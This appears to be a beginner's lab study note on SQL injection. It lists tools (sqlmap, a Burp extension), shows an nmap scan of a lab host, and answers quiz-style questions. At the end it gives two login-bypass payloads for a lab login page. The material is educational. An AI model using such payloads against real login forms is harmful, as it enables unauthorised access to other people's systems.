# SQL Injection Attack (SQLi)
* SQL stands for Structured Query language
* OWASP A03:2021-Injection (https://owasp.org/www-project-top-ten/)
## Tools
```
CLI Tools:
    sqlmap
Burp Extensions:
    SQLiPy (https://portswigger.net/support/using-burp-with-sqlmap)
```
* Sample scan results
```
┌──(root㉿kali)-[~]
└─# nmap -sC -sV 10.129.18.37    
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-05 14:45 EDT
Nmap scan report for 10.129.18.37
Host is up (1.0s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.72 seconds
┌──(root㉿kali)-[~]
└─# 
```
* What does Nmap report as the service and version that are running on port 80 of the target? - Apache httpd 2.4.38 ((Debian)) 
* 443 is the standard port used for the HTTPS protocol.
* Directory is a folder called in web-application terminology.
* 404 is the HTTP response code is given for 'Not Found' errors.
* "#" is a single character can be used to comment out the rest of a line in MySQL.
* SQL payloads for login page(Web page: Port 80):
```
admin'#
1' or '1'='1
```
